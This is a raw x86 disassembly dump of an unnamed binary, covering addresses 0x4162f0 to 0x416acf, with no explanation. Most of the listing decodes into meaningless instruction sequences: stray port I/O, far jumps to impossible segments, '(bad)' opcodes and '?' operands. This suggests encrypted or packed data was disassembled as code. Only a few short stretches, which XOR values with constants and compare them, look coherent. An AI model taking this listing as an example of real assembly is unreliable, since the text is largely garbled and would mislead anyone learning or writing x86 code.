  4162f0:	and    BYTE PTR [esi-0x3cd651e1],ah
  4162f6:	xchg   esp,eax
  4162f7:	in     al,0x3f
  4162f9:	push   0xffffffe6
  4162fb:	in     eax,0x1b
  4162fd:	or     al,0xb2
  4162ff:	mov    eax,ds:0x1e94e884
  416304:	cwde   
  416305:	jecxz  0x416307
  416307:	adc    ebx,DWORD PTR [ebp+0x7c1afbe9]
  41630d:	sti    
  41630e:	scas   eax,DWORD PTR es:[edi]
  41630f:	ins    DWORD PTR es:[edi],dx
  416310:	mov    WORD PTR [edi+0x2191f59a],es
  416316:	aas    
  416317:	push   0xffffffb4
  416319:	jnp    0x4162fb
  41631b:	sub    al,0xeb
  41631d:	or     esi,DWORD PTR [edx]
  41631f:	mov    ds:0x947eddf7,eax
  416324:	pusha  
  416325:	cmp    dh,BYTE PTR [ebx+ecx*2]
  416328:	in     al,0xab
  41632a:	sbb    eax,0xc41e91f5
  41632f:	stc    
  416330:	push   ss
  416331:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416332:	ret    
  416333:	mov    eax,ds:0x57a4c9f0
  416338:	pop    esi
  416339:	mov    ecx,DWORD PTR [ebx]
  41633b:	mov    DWORD PTR [ebp+0x14],edi
  41633e:	mov    edi,DWORD PTR [ebx+0x4]
  416341:	xor    ecx,0xba699573
  416347:	xor    edi,0x9c0a89d8
  41634d:	shrd   ecx,edi,0x2
  416351:	or     ecx,DWORD PTR [ebp+0x10]
  416354:	shr    edi,0x2
  416357:	mov    DWORD PTR [ebp-0x70],ecx
  41635a:	mov    ecx,edi
  41635c:	or     ecx,DWORD PTR [ebp+0x14]
  41635f:	mov    DWORD PTR [ebp+0xc],edi
  416362:	cmp    edx,DWORD PTR [ebp-0x70]
  416365:	jne    0x41a17f
  41636b:	cmp    DWORD PTR [ebp-0x64],ecx
  41636e:	jne    0x41a17f
  416374:	jmp    0x41854e
  416379:	mov    eax,DWORD PTR [esi]
  41637b:	mov    edx,DWORD PTR [esi+0x4]
  41637e:	mov    eax,DWORD PTR [esi]
  416380:	mov    edx,DWORD PTR [esi+0x4]
  416383:	jmp    0x41690d
  416388:	and    DWORD PTR [ecx-0x37],ebp
  41638b:	mov    esp,0x68181cb9
  416390:	loopne 0x4163ad
  416392:	lods   al,BYTE PTR ds:[esi]
  416393:	scas   al,BYTE PTR es:[edi]
  416394:	sbb    al,0x4a
  416396:	mov    eax,0xcaf4d72
  41639b:	push   ss
  41639c:	cmp    eax,0x1b161604
  4163a1:	in     eax,0x5d
  4163a3:	fmul   st(7),st
  4163a5:	mov    esp,0x44939af7
  4163aa:	mov    bh,0x73
  4163ac:	stos   BYTE PTR es:[edi],al
  4163ad:	sbb    BYTE PTR [edi+0x33348e58],ah
  4163b3:	(bad)  
  4163b4:	(bad)  
  4163b5:	cmp    BYTE PTR [edi],al
  4163b7:	xchg   BYTE PTR [edi],ah
  4163b9:	mov    DWORD PTR [ebx-0x49],ebp
  4163bc:	pop    edi
  4163bd:	iret   
  4163be:	out    dx,al
  4163bf:	clc    
  4163c0:	out    dx,eax
  4163c1:	aaa    
  4163c2:	cmc    
  4163c3:	push   0x9763a7dc
  4163c8:	ins    DWORD PTR es:[edi],dx
  4163c9:	adc    BYTE PTR [ebx+0x68],ah
  4163cc:	lahf   
  4163cd:	inc    esp
  4163ce:	sub    DWORD PTR ds:0xaac75eb2,eax
  4163d4:	sub    dl,BYTE PTR [ebp+0x69]
  4163d7:	into   
  4163d8:	jmp    0x9dfe:0xdb012481
  4163df:	call   0x714af083
  4163e4:	test   DWORD PTR ds:0xf086fc7c,ecx
  4163ea:	scas   al,BYTE PTR es:[edi]
  4163eb:	arpl   WORD PTR [esi],cx
  4163ed:	fstp   QWORD PTR [edx-0x19fc3f8e]
  4163f3:	repnz inc ebx
  4163f5:	cwde   
  4163f6:	aad    0x1d
  4163f8:	mov    esi,0x47d4d6e6
  4163fd:	adc    dl,BYTE PTR [ebp-0x6]
  416400:	shl    BYTE PTR [eax+0x5b],cl
  416403:	int    0x74
  416405:	cld    
  416406:	sbb    ch,BYTE PTR [esi+0x2e]
  416409:	js     0x4163cd
  41640b:	push   cs
  41640c:	xchg   esp,eax
  41640d:	pop    ss
  41640e:	cdq    
  41640f:	popf   
  416410:	xor    ecx,DWORD PTR [eax+0x7]
  416413:	fwait
  416414:	ja     0x416486
  416416:	jl     0x41645a
  416418:	aad    0x18
  41641a:	push   ds
  41641b:	sub    BYTE PTR [ecx-0x80],dl
  41641e:	push   ecx
  41641f:	cmp    cl,0x5d
  416422:	jl     0x41641b
  416424:	mov    dh,0xba
  416426:	mov    edx,0xf8270915
  41642b:	ret    0x349f
  41642e:	mov    al,ds:0x597fbf2f
  416433:	fimul  DWORD PTR [ebx-0x3ec37cf8]
  416439:	(bad)  
  41643a:	mov    al,BYTE PTR [ebx]
  41643c:	push   0x18
  41643e:	into   
  41643f:	sub    al,0x11
  416441:	push   cs
  416442:	cdq    
  416443:	jle    0x416405
  416445:	and    ebp,DWORD PTR [eax+0x67]
  416448:	scas   al,BYTE PTR es:[edi]
  416449:	sar    eax,1
  41644b:	fs repz das 
  41644e:	mov    ds:0x1944fe50,eax
  416453:	add    BYTE PTR [eax-0xf1da735],dh
  416459:	pop    esp
  41645a:	stc    
  41645b:	aad    0xe1
  41645d:	(bad)  
  41645f:	dec    ebp
  416460:	js     0x41646f
  416462:	pop    ebp
  416463:	pusha  
  416464:	icebp  
  416465:	inc    esp
  416466:	adc    cl,BYTE PTR [esi]
  416468:	daa    
  416469:	stc    
  41646a:	in     al,0x4a
  41646c:	out    dx,al
  41646d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41646e:	mov    dl,bl
  416470:	out    dx,al
  416471:	ins    BYTE PTR es:[edi],dx
  416472:	sahf   
  416473:	ja     0x41644a
  416475:	or     eax,0x6a108131
  41647a:	imul   BYTE PTR [eax-0x192869f6]
  416480:	clc    
  416481:	and    eax,0xef46a038
  416486:	push   ecx
  416487:	or     BYTE PTR [ecx],0x29
  41648a:	push   ecx
  41648b:	loopne 0x416481
  41648d:	scas   eax,DWORD PTR es:[edi]
  41648e:	mov    ch,0x5a
  416490:	sbb    al,0xcb
  416492:	fstp   DWORD PTR [ebx+0x18]
  416495:	loopne 0x41645c
  416497:	lods   al,BYTE PTR ds:[esi]
  416498:	cs pop es
  41649a:	mov    ebp,0xf97d3760
  41649f:	jle    0x4164b7
  4164a1:	(bad)  
  4164a2:	aas    
  4164a3:	cs inc esi
  4164a5:	push   es
  4164a6:	sbb    esi,DWORD PTR ds:0xdc0ababc
  4164ac:	fnsave [edi-0x1]
  4164af:	mov    ds:0xe1701b29,al
  4164b4:	mov    al,ds:0xe2a5bde9
  4164b9:	push   eax
  4164ba:	lahf   
  4164bb:	fisub  WORD PTR [edx+0x4ed36171]
  4164c1:	xor    esi,eax
  4164c3:	call   0xcb62:0xd5bd0090
  4164ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164cb:	int    0xea
  4164cd:	lahf   
  4164ce:	ret    0x6f79
  4164d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164d2:	or     cl,BYTE PTR [edx]
  4164d4:	rcl    ah,0x84
  4164d7:	nop
  4164d8:	pop    esi
  4164d9:	fcom   QWORD PTR [edx]
  4164db:	cdq    
  4164dc:	inc    edi
  4164dd:	pop    ebp
  4164de:	and    DWORD PTR [ecx-0x462e284b],ebp
  4164e4:	jp     0x416545
  4164e6:	add    al,BYTE PTR [edi]
  4164e8:	xlat   BYTE PTR ds:[ebx]
  4164e9:	jb     0x416517
  4164eb:	mov    es,ebx
  4164ed:	inc    esi
  4164ee:	(bad)
  4164f2:	js     0x416545
  4164f4:	jg     0x416525
  4164f6:	rol    BYTE PTR [edi],0x1a
  4164f9:	or     cl,ah
  4164fb:	jmp    0x96b0:0x62729de1
  416502:	dec    edx
  416503:	loop   0x416582
  416505:	add    ebx,ebp
  416507:	rcr    BYTE PTR [ebp+0x1b3d9a70],1
  41650d:	loop   0x4164ab
  41650f:	inc    edx
  416510:	test   eax,0x7e92b057
  416515:	mov    bh,0xb0
  416517:	clc    
  416518:	and    BYTE PTR [edi+ecx*2+0x52690599],al
  41651f:	pop    edi
  416520:	jno    0x41657d
  416522:	push   ebp
  416523:	xor    cl,bh
  416525:	call   DWORD PTR [ebx-0x80]
  416528:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416529:	xor    DWORD PTR [ebx],ebx
  41652b:	pusha  
  41652c:	xlat   BYTE PTR ds:[ebx]
  41652d:	adc    DWORD PTR [edi-0x46],eax
  416530:	jns    0x4164de
  416532:	jae    0x416508
  416534:	adc    eax,0xd8dee220
  416539:	nop
  41653a:	aad    0xcb
  41653c:	repz pusha 
  41653e:	(bad)
  416541:	pop    ebx
  416542:	sub    BYTE PTR [esi],dl
  416544:	into   
  416545:	or     cl,bl
  416547:	add    al,0x40
  416549:	xchg   ebp,eax
  41654a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41654b:	pop    edx
  41654c:	adc    al,al
  41654e:	out    0x65,eax
  416550:	sahf   
  416551:	mov    al,0xf9
  416553:	adc    DWORD PTR [esi+0x722fbc7],edi
  416559:	fmul   QWORD PTR [ebp+0x4f]
  41655c:	push   ss
  41655d:	pushf  
  41655e:	pop    gs
  416560:	adc    ah,BYTE PTR [ecx-0x13ffb84f]
  416566:	das    
  416567:	pop    ds
  416568:	mov    ebx,0xf4c63c91
  41656d:	sub    BYTE PTR [esp+eiz*4-0x36],cl
  416571:	ret    0x2140
  416574:	and    al,0x6d
  416576:	add    eax,DWORD PTR [esi-0x20]
  416579:	mov    bh,0x60
  41657b:	dec    eax
  41657d:	pop    edx
  41657e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41657f:	sub    dl,BYTE PTR [ebp+0x1b4bb824]
  416585:	dec    esi
  416586:	pop    DWORD PTR [ecx]
  416588:	popf   
  416589:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41658a:	or     esi,edx
  41658c:	add    eax,0xa8dfff35
  416591:	popa   
  416592:	sub    esi,ebp
  416594:	test   BYTE PTR [ebx],dl
  416596:	dec    esi
  416597:	push   edi
  416598:	mov    esp,0x18c0dfc4
  41659d:	sub    edx,DWORD PTR [eax]
  41659f:	sub    ebx,DWORD PTR [esi]
  4165a1:	outs   dx,DWORD PTR ds:[esi]
  4165a2:	or     edi,DWORD PTR [ebx-0x67ce70dc]
  4165a8:	jns    0x41657a
  4165aa:	fst    QWORD PTR [eax+0x2c0ced09]
  4165b0:	pushf  
  4165b1:	jmp    0x415ceb7d
  4165b6:	aam    0x3a
  4165b8:	inc    ecx
  4165b9:	xlat   BYTE PTR ds:[ebx]
  4165ba:	bound  esi,QWORD PTR [esi+0x1db01f9e]
  4165c0:	jp     0x416573
  4165c2:	ds inc esp
  4165c4:	push   0xb6ed7cfe
  4165c9:	bound  ecx,QWORD PTR [ebx-0x7d]
  4165cc:	scas   eax,DWORD PTR es:[edi]
  4165cd:	adc    edx,edi
  4165cf:	inc    esp
  4165d0:	xchg   ebp,eax
  4165d1:	icebp  
  4165d2:	jb     0x416649
  4165d4:	jecxz  0x416570
  4165d6:	scas   eax,DWORD PTR es:[edi]
  4165d7:	push   ebx
  4165d8:	and    esi,esi
  4165da:	cs xchg ecx,eax
  4165dc:	mov    eax,0xcd4c8322
  4165e1:	mov    bl,0xa5
  4165e3:	cmp    bh,dh
  4165e5:	mov    dh,0x14
  4165e7:	inc    esi
  4165e8:	lock sbb eax,0x2afa7408
  4165ee:	retf   
  4165ef:	mov    cl,dl
  4165f1:	dec    eax
  4165f2:	fisttp QWORD PTR [eax-0x58]
  4165f5:	or     al,0xc3
  4165f7:	cs pop eax
  4165f9:	and    eax,0xd5519401
  4165fe:	gs cmp al,0x61
  416601:	lahf   
  416602:	xor    eax,esi
  416604:	inc    esi
  416605:	ds scas eax,DWORD PTR es:[edi]
  416607:	(bad)  
  416608:	js     0x4165bb
  41660a:	sar    DWORD PTR [edi-0x6c],0x7c
  41660e:	data16 mov al,ds:0xe47e396
  416614:	or     al,0x4b
  416616:	out    0xcc,al
  416618:	bswap  ebp
  41661a:	cmp    al,0x3d
  41661c:	pop    es
  41661d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41661e:	sahf   
  41661f:	ja     0x4165e4
  416621:	(bad)  
  416622:	fild   DWORD PTR [ebx]
  416624:	dec    eax
  416625:	int3   
  416626:	mov    bl,0xbb
  416628:	cli    
  416629:	pop    esp
  41662a:	fst    DWORD PTR [esi+0x5d]
  41662d:	xchg   esi,eax
  41662e:	dec    ebx
  41662f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416630:	cmp    al,0xde
  416632:	jecxz  0x416643
  416634:	stc    
  416635:	loop   0x41661c
  416637:	add    eax,0x3fd6dca7
  41663c:	cs add al,0xb4
  41663f:	lea    edi,[edx]
  416641:	sbb    eax,0x627d99f9
  416646:	mov    ch,0x6c
  416648:	call   0xb681:0x9494b05b
  41664f:	or     ecx,DWORD PTR [ecx-0x1a92651f]
  416655:	sti    
  416656:	gs xor ch,ah
  416659:	ret    
  41665a:	mov    eax,ds:0x84900708
  41665f:	sahf   
  416660:	mov    dl,0xa1
  416662:	cdq    
  416663:	jb     0x4165e9
  416665:	retf   
  416666:	call   0x6402dac2
  41666b:	lods   eax,DWORD PTR ds:[esi]
  41666c:	loopne 0x41667b
  41666e:	aam    0x8a
  416670:	rcl    DWORD PTR [ecx],0xfa
  416673:	xor    eax,0x9235b298
  416678:	clc    
  416679:	adc    eax,0x89fd20bd
  41667e:	push   ebx
  41667f:	scas   eax,DWORD PTR es:[edi]
  416680:	add    BYTE PTR [ebp-0x770ff510],bh
  416686:	or     ebx,0xa92cc6f4
  41668c:	jno    0x41663a
  41668e:	adc    eax,edi
  416690:	sub    al,0x91
  416692:	mov    ebp,0x40e27689
  416697:	mov    DWORD PTR [esi],esp
  416699:	mov    eax,ds:0x68422a12
  41669e:	inc    esi
  41669f:	jle    0x4166f3
  4166a1:	add    cl,0x60
  4166a4:	adc    al,0xe9
  4166a6:	cmp    BYTE PTR [edi+0x40],ch
  4166a9:	dec    ebp
  4166aa:	lds    edi,FWORD PTR [esi]
  4166ac:	fwait
  4166ad:	mov    ds:0x55376b60,eax
  4166b2:	fdivr  DWORD PTR [edx+eiz*1+0x2]
  4166b6:	ret    
  4166b7:	arpl   ax,ax
  4166b9:	shl    BYTE PTR [esi+ecx*8-0x1656920a],cl
  4166c0:	inc    edx
  4166c1:	jne    0x416671
  4166c3:	rcr    DWORD PTR [edi+0x70b3dc06],cl
  4166c9:	stos   DWORD PTR es:[edi],eax
  4166ca:	mov    DWORD PTR [ecx+0x68d57d1f],0xdb2fcf7b
  4166d4:	div    BYTE PTR [edx+ebx*8]
  4166d7:	add    al,0xd0
  4166d9:	sahf   
  4166da:	out    0xd,eax
  4166dc:	scas   al,BYTE PTR es:[edi]
  4166dd:	popa   
  4166de:	cmp    eax,0x8dbdc879
  4166e3:	inc    ecx
  4166e4:	cmp    eax,0x30f5ec06
  4166e9:	xor    esp,DWORD PTR [esi]
  4166eb:	mov    bl,0x53
  4166ed:	sbb    al,0x94
  4166ef:	mov    bh,0x72
  4166f1:	mov    BYTE PTR [esi-0x2f672b38],cl
  4166f7:	inc    ebp
  4166f8:	ret    
  4166f9:	push   ds
  4166fa:	xchg   ebp,eax
  4166fb:	sub    al,0x43
  4166fd:	in     eax,0x55
  4166ff:	sub    eax,0x43488790
  416704:	sbb    DWORD PTR [ecx-0x73],ecx
  416707:	mov    esi,0x5df9ee6a
  41670c:	cmp    cl,ah
  41670e:	retf   0xf2b9
  416711:	js     0x4166db
  416713:	xchg   edi,eax
  416714:	mov    bl,0x13
  416716:	rol    BYTE PTR [ebp+0x4d9514f],1
  41671c:	jbe    0x416755
  41671e:	in     eax,0xa3
  416720:	into   
  416721:	ret    
  416722:	pop    esp
  416723:	pop    ebx
  416724:	test   BYTE PTR [ebx+0x1ac70f1a],ah
  41672a:	xlat   BYTE PTR ds:[ebx]
  41672b:	xchg   esi,eax
  41672c:	clc    
  41672d:	loope  0x416735
  41672f:	xchg   esi,eax
  416730:	xchg   ecx,eax
  416731:	or     dl,BYTE PTR [ecx-0x1119595d]
  416737:	dec    ebx
  416738:	stos   DWORD PTR es:[edi],eax
  416739:	mov    ds:0x523f5c9a,eax
  41673e:	nop
  41673f:	sbb    DWORD PTR [ecx+0x107a7d0c],ecx
  416745:	clc    
  416746:	ins    BYTE PTR es:[edi],dx
  416747:	mov    BYTE PTR [eax-0x41],cl
  41674a:	aam    0x87
  41674c:	push   ds
  41674d:	sub    dh,BYTE PTR [ecx-0x31bc17e8]
  416753:	xchg   BYTE PTR [ebp+0x1b60eacb],bl
  416759:	add    DWORD PTR [edi-0x4fff121c],edi
  41675f:	je     0x41673f
  416761:	in     al,0x3f
  416763:	scas   eax,DWORD PTR es:[edi]
  416764:	popf   
  416765:	out    dx,al
  416766:	and    dl,dh
  416768:	bound  ebp,QWORD PTR [eax-0x1e18d703]
  41676e:	jmp    0xdc3ed594
  416773:	out    0x29,eax
  416775:	aam    0x34
  416777:	xchg   ebp,eax
  416778:	add    DWORD PTR [edi+0x700e3248],ebp
  41677e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41677f:	cmp    eax,0x37f1ac73
  416784:	adc    dl,bl
  416786:	sahf   
  416787:	inc    edi
  416788:	push   eax
  416789:	inc    ebx
  41678a:	xor    DWORD PTR [bx+0x21],edi
  41678e:	or     eax,0x3be84429
  416793:	arpl   di,si
  416795:	lods   al,BYTE PTR gs:[esi]
  416797:	retf   0xe4d2
  41679a:	hlt    
  41679b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41679c:	push   cs
  41679d:	loop   0x41673f
  41679f:	clc    
  4167a0:	cdq    
  4167a1:	inc    esi
  4167a2:	pop    eax
  4167a3:	sub    DWORD PTR [edx-0x40],edi
  4167a6:	adc    DWORD PTR [edx+0x61e1e4fe],0xfffffff2
  4167ad:	jmp    0x41674d
  4167af:	mov    esi,0xa5ecccea
  4167b4:	mov    edx,?
  4167b6:	inc    edi
  4167b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167b8:	xor    eax,DWORD PTR [eax]
  4167ba:	imul   ecx,DWORD PTR ds:0xf257bfb6,0xf73b27f6
  4167c4:	or     ch,dl
  4167c6:	cmc    
  4167c7:	rol    BYTE PTR [esp+ebx*8+0x62275c0b],0x6f
  4167cf:	les    esp,FWORD PTR [ecx-0x5]
  4167d2:	mov    dl,0x23
  4167d4:	cmp    eax,0x892d8aab
  4167d9:	ja     0x41684f
  4167db:	(bad)
  4167df:	sbb    eax,0x56a09b8a
  4167e4:	scas   eax,DWORD PTR es:[edi]
  4167e5:	mov    ebp,0x1dce9abd
  4167ea:	mov    dh,0x21
  4167ec:	fisttp DWORD PTR [ecx-0x58b660af]
  4167f2:	cwde   
  4167f3:	mov    al,ds:0x31aa9a79
  4167f8:	and    al,0xed
  4167fa:	jns    0x416819
  4167fc:	in     al,0xd7
  4167fe:	test   BYTE PTR [ebp+0x75e29ac9],ah
  416804:	sbb    BYTE PTR [ebx],al
  416806:	sbb    bl,BYTE PTR [ebp-0x43]
  416809:	xor    dh,bl
  41680b:	ficom  WORD PTR [ebx+0x470db17]
  416811:	mov    edx,0x988f3b63
  416816:	pop    ebp
  416817:	inc    ebp
  416818:	fist   WORD PTR gs:[ebx-0x3fc88fbf]
  41681f:	add    cl,al
  416821:	add    bh,al
  416823:	sub    al,0xbb
  416825:	sub    dh,ah
  416827:	adc    al,0x2b
  416829:	jb     0x4167c2
  41682b:	es push edi
  41682d:	dec    BYTE PTR [edx+0x64b0a955]
  416833:	cdq    
  416834:	jns    0x4167fe
  416836:	adc    eax,0x881ef96a
  41683b:	adc    esi,DWORD PTR [edx+0xe]
  41683e:	mov    BYTE PTR [ecx-0x51b4a5d1],bh
  416844:	sub    al,0x7
  416846:	repz (bad) 
  416848:	mov    al,0xe8
  41684a:	dec    ecx
  41684b:	loope  0x4168c0
  41684d:	nop
  41684e:	add    BYTE PTR [eax+0x23],dl
  416851:	pop    edx
  416852:	jae    0x416824
  416854:	iret   
  416855:	outs   dx,BYTE PTR ds:[esi]
  416856:	dec    ebx
  416857:	xchg   ecx,eax
  416858:	(bad)  
  416859:	push   esp
  41685a:	push   ebx
  41685b:	scas   al,BYTE PTR es:[edi]
  41685c:	imul   edx,DWORD PTR [edx],0xffffffd2
  41685f:	(bad)  
  416861:	(bad)  
  416862:	xchg   esp,eax
  416863:	xor    al,0xe8
  416865:	xchg   esi,eax
  416866:	adc    al,dh
  416868:	cmp    BYTE PTR [esi-0x2b97dda1],al
  41686e:	fcomp  st(5)
  416870:	sbb    edx,DWORD PTR [eax]
  416872:	inc    esp
  416873:	mov    edx,0x40a125e3
  416878:	imul   ebx,DWORD PTR [ebp-0x8],0xa7ab1712
  41687f:	or     BYTE PTR [ebx+0x5f],dh
  416882:	cwde   
  416883:	bound  edx,QWORD PTR [eax+0x6be6ada8]
  416889:	in     eax,0x70
  41688b:	out    dx,eax
  41688c:	or     esi,edx
  41688e:	mov    eax,0x19def1db
  416893:	xor    ch,bl
  416895:	lds    edx,FWORD PTR [eax]
  416897:	call   0x91b92c39
  41689c:	mov    WORD PTR [edi-0x48],gs
  41689f:	and    DWORD PTR [eax-0x5af85f9a],ebp
  4168a5:	iret   
  4168a6:	jge    0x4168e3
  4168a8:	dec    esi
  4168a9:	mov    dh,0x83
  4168ab:	push   ss
  4168ac:	sti    
  4168ad:	xchg   ebp,eax
  4168ae:	add    cl,BYTE PTR [esi]
  4168b0:	jne    0x4168cf
  4168b2:	cwde   
  4168b3:	es pop es
  4168b5:	push   edx
  4168b6:	jne    0x416894
  4168b8:	out    dx,eax
  4168b9:	mov    ds:0xc3119960,eax
  4168be:	cmc    
  4168bf:	mov    ds:0xd2829533,eax
  4168c4:	ret    
  4168c5:	enter  0xb659,0xf2
  4168c9:	(bad)  
  4168ca:	push   eax
  4168cb:	ins    BYTE PTR es:[edi],dx
  4168cc:	xchg   ebx,eax
  4168cd:	lods   eax,DWORD PTR ds:[esi]
  4168ce:	and    al,0x21
  4168d0:	adc    DWORD PTR [eax+0x74],ecx
  4168d3:	ret    
  4168d4:	ds mov esi,esi
  4168d7:	jge    0x4168fa
  4168d9:	xchg   esp,eax
  4168da:	ins    DWORD PTR es:[edi],dx
  4168db:	adc    DWORD PTR [edx+edi*8+0x78],edi
  4168df:	push   esp
  4168e0:	jl     0x4168d8
  4168e2:	mov    al,0x4c
  4168e4:	push   esi
  4168e5:	or     eax,0x38ee93d2
  4168ea:	cwde   
  4168eb:	cdq    
  4168ec:	sti    
  4168ed:	in     eax,dx
  4168ee:	and    esi,DWORD PTR [esi+0x55]
  4168f1:	xchg   edx,eax
  4168f2:	je     0x4168bc
  4168f4:	adc    DWORD PTR [ebp-0x43],esp
  4168f7:	add    al,0x14
  4168f9:	mov    eax,0xb637fbae
  4168fe:	add    DWORD PTR [ebx-0x22bb4b77],edx
  416904:	sub    eax,0x8a286a63
  416909:	pusha  
  41690a:	clc    
  41690b:	fistp  WORD PTR [ebx-0x75]
  41690e:	shl    BYTE PTR [ebx],1
  416910:	rol    cl,0xe2
  416913:	push   ds
  416914:	mov    DWORD PTR [ebp+0x10],eax
  416917:	mov    eax,DWORD PTR [esi]
  416919:	xor    edx,0xc0000000
  41691f:	mov    DWORD PTR [ebp+0x14],edx
  416922:	mov    edx,DWORD PTR [esi+0x4]
  416925:	jmp    0x416eaf
  41692a:	or     BYTE PTR [edx+0x20a461f6],ch
  416930:	jns    0x416944
  416932:	stc    
  416933:	repz sbb BYTE PTR [eax+0x6ecc3c6c],ch
  41693a:	jp     0x4168d9
  41693c:	or     al,0x16
  41693e:	cmp    eax,0x5a161604
  416943:	popf   
  416944:	dec    ebp
  416945:	sub    al,0xa
  416947:	sub    bh,BYTE PTR [ebx-0x47]
  41694a:	ret    0xc32b
  41694d:	lds    edi,FWORD PTR [esi+eax*8-0x2f9d9d65]
  416954:	pop    ecx
  416955:	test   BYTE PTR ds:0x13e1252b,cl
  41695b:	addr16 into 
  41695d:	popa   
  41695e:	lods   al,BYTE PTR ds:[esi]
  41695f:	loope  0x416928
  416961:	mov    esp,0x56fefdd3
  416966:	in     eax,dx
  416967:	mov    dh,0x28
  416969:	lahf   
  41696a:	addr16 inc ebx
  41696c:	mov    dl,0x90
  41696e:	dec    edi
  41696f:	pop    esp
  416970:	jp     0x41694a
  416972:	fnstenv [esi]
  416974:	jg     0x41699a
  416976:	mov    al,0xb3
  416978:	js     0x416956
  41697a:	je     0x416925
  41697c:	mov    ebp,0xf7e8996d
  416981:	aaa    
  416982:	gs ret 
  416984:	push   es
  416985:	xchg   ebp,eax
  416986:	jge    0x41698c
  416988:	das    
  416989:	js     0x4169c1
  41698b:	mov    ds,WORD PTR [eax]
  41698d:	mov    ?,WORD PTR [ebp+0x1d781642]
  416993:	hlt    
  416994:	cli    
  416995:	ja     0x41692e
  416997:	pop    edx
  416998:	adc    eax,0x6fe85e78
  41699d:	ror    BYTE PTR [eax-0x7437ccf5],0x60
  4169a4:	and    al,BYTE PTR [edx+0x36]
  4169a7:	rcl    ebp,cl
  4169a9:	retf   0x498d
  4169ac:	(bad)  
  4169ae:	pop    esp
  4169af:	es mov bl,0x6e
  4169b2:	xchg   DWORD PTR [ebp-0x14],edi
  4169b5:	pop    edi
  4169b6:	ds mov dh,0x39
  4169b9:	jae    0x416a14
  4169bb:	sub    DWORD PTR [edx],edx
  4169bd:	mov    edi,0xb70fa780
  4169c2:	loop   0x416975
  4169c4:	cmp    eax,0xa2af0d61
  4169c9:	xor    cl,dh
  4169cb:	nop
  4169cc:	xchg   ebp,eax
  4169cd:	xchg   esp,eax
  4169ce:	mov    edx,0xfa4dcb6e
  4169d3:	dec    esi
  4169d4:	adc    eax,0x7830385
  4169d9:	mov    edx,0x47f9a23b
  4169de:	es aam 0x48
  4169e1:	repz lea ebp,[ecx+0x790b8dae]
  4169e8:	dec    edi
  4169e9:	les    eax,FWORD PTR [edx+0x46]
  4169ec:	xor    ebx,edx
  4169ee:	and    cl,BYTE PTR [ebx+0x58425c70]
  4169f4:	push   edx
  4169f5:	lds    eax,FWORD PTR [ecx]
  4169f7:	xor    DWORD PTR [eax+0x36a47b91],ebx
  4169fd:	cmc    
  4169fe:	pop    ecx
  4169ff:	jg     0x416a26
  416a01:	inc    ebp
  416a02:	test   al,0x3
  416a04:	adc    al,0x75
  416a06:	inc    ebx
  416a07:	mov    ds:0x9912384c,eax
  416a0c:	fucomip st,st(0)
  416a0e:	clc    
  416a0f:	ror    BYTE PTR [ebp-0x74],cl
  416a12:	adc    al,0x69
  416a14:	push   esp
  416a15:	jge    0x4169ef
  416a17:	sbb    eax,0x78caaa51
  416a1c:	js     0x4169b5
  416a1e:	in     al,0x1d
  416a20:	mov    ?,WORD PTR [ecx]
  416a22:	shl    BYTE PTR [edi+0x29],0x2e
  416a26:	mov    ch,BYTE PTR [ecx-0x633e5e49]
  416a2c:	push   eax
  416a2d:	inc    eax
  416a2e:	(bad)  
  416a2f:	je     0x416a23
  416a31:	or     al,0x25
  416a33:	push   esi
  416a34:	test   al,0x21
  416a36:	mov    dh,0xde
  416a38:	adc    ah,0xa6
  416a3b:	lods   al,BYTE PTR ds:[esi]
  416a3c:	sub    cl,BYTE PTR [ebp-0x25]
  416a3f:	or     eax,0xae44ce0e
  416a44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a45:	mov    ebp,0x3a474ded
  416a4a:	xchg   esp,eax
  416a4b:	aaa    
  416a4c:	(bad)  
  416a4d:	push   edx
  416a4e:	les    ebx,FWORD PTR [ebx-0x1580370e]
  416a54:	inc    ebx
  416a55:	mov    WORD PTR [eax+0x318421db],es
  416a5b:	mov    dl,ah
  416a5d:	jmp    0x416a3c
  416a5f:	jne    0x4169fd
  416a61:	mov    dl,0xd6
  416a63:	cmp    DWORD PTR [esi],ebp
  416a65:	xchg   BYTE PTR [edi],cl
  416a67:	popf   
  416a68:	outs   dx,BYTE PTR ds:[esi]
  416a69:	add    eax,0x993b32f9
  416a6e:	cmc    
  416a6f:	iret   
  416a70:	push   DWORD PTR [edx+0x3e]
  416a73:	push   ss
  416a74:	out    0x7f,eax
  416a76:	sbb    eax,0xb1c8fa11
  416a7b:	jno    0x416abd
  416a7d:	sub    ah,BYTE PTR [eax]
  416a7f:	dec    ebp
  416a80:	xor    DWORD PTR [edx+0x5],esi
  416a83:	xchg   edx,eax
  416a84:	into   
  416a85:	adc    dl,BYTE PTR [ebx+0x576d84a4]
  416a8b:	mov    ecx,0x9e789472
  416a90:	fs jg  0x416add
  416a93:	adc    al,0xc9
  416a95:	out    0x8b,al
  416a97:	out    dx,eax
  416a98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a9a:	pop    ecx
  416a9b:	mov    eax,ds:0xc7982eed
  416aa0:	ret    0x2f62
  416aa3:	retf   
  416aa4:	mov    DWORD PTR [ebx-0x7ecb4325],esi
  416aaa:	scas   al,BYTE PTR es:[edi]
  416aab:	imul   ecx,DWORD PTR [ecx-0x3be35452],0x56
  416ab2:	sub    eax,0xa6da0c60
  416ab7:	mov    ds:0x3de5b06e,al
  416abc:	and    BYTE PTR [edi],cl
  416abe:	popf   
  416abf:	(bad)  
  416ac0:	test   eax,0x4176f803
  416ac5:	sar    DWORD PTR [esi+0x76],0xb0
  416ac9:	mov    ah,0x82
  416acb:	jnp    0x416b30
  416acd:	popf   
  416ace:	cmc    
  416acf:	ret    
